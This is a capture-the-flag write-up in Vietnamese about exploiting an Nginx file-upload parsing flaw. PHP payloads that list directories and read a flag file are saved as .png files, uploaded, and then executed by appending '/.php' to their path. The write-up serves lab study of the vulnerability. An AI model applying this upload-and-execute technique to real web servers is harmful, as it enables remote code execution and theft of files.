# VulnNginx

- Bài này chúng ta sẽ khai thác vào lỗ hổng parsing khi upload file của Nginx. Do cấu hình sau của `nginx.conf`, Nginx sẽ chuyển các tệp có đuôi là `.php` cho `FastCGI` để xử lý. Đối với bất kỳ tên tệp nào, hãy thêm /xxx.php (xxx) làm ký tự tùy ý, sau đó tệp có thể được phân tích cú pháp thành php.

Khi nhận đề bài, việc đầu tiên chúng ta cần tiến hành đó là kiểm tra source code. Tại file `upload.php` chỉ cho phép chúng ta upload hình ảnh dưới 1kb và chỉ hỗ trợ các định dạng: `gif`, `png`, `jpg`, `jpeg`.

![File upload.php](/Images/upload.png)


## Quét tập tin

* Tạo file `scan.php` để tiến hành dò tên file Flag, sau đó chuyển định dạng thành `.png` với nội dung code:
```php
<?php
  // Specifying directory
  $mydir = '../../../../';
 
  // Scanning files in a given directory in unsorted order
  $myfiles = scandir($mydir, SCANDIR_SORT_NONE);
 
  // Displaying the files in the directory
  print_r($myfiles);
?>
```
> Dựa vào file `start.sh` trong source code ta có thể biết được vị trí thư mục của file Flag cũng như định dạng của file Flag sẽ là `flag_${RND}.txt` với `${RND}` là một chuỗi random MD5.

![File start.sh](/Images/start.png)

* Upload file `scan.png` vừa tạo lên server ta được 1 file mới với đường dẫn là `/var/www/html/uploadfiles/84bd22bd3c80955d764fd0a4a95e1ce0.png`.

![Upload scan.png](/Images/scan.png)

Để thực thi file ta thêm hậu tố `/.php` để Nginx nhận diện đây là file php và thực thi nó.

![Scan directory](/Images/scandir.png)

## Đọc Flag

Cuối cùng sẽ là đọc nội dung file `flag_68b329da9893e34.txt`

Tương tự với cách quét thư mục, ta tạo file `readflag.png` với đoạn code:
```php
<?php
  $myfile = fopen("../../../../flag_68b329da9893e34.txt", "r") or die("Unable to open file!");
  echo fread($myfile,filesize("../../../../flag_68b329da9893e34.txt"));
  fclose($myfile);
?>
```
Upload file lên và nhận kết quả.

![Read Flag](/Images/flag.png)

```bash
W1{Nginx_parsing_is_not_safe,right?}
```

### Nguồn tham khảo
- https://www.programmersought.net/article/389137801.html
- https://www.geeksforgeeks.org/php-scandir-function/
- https://www.w3schools.com/php/php_file_open.asp
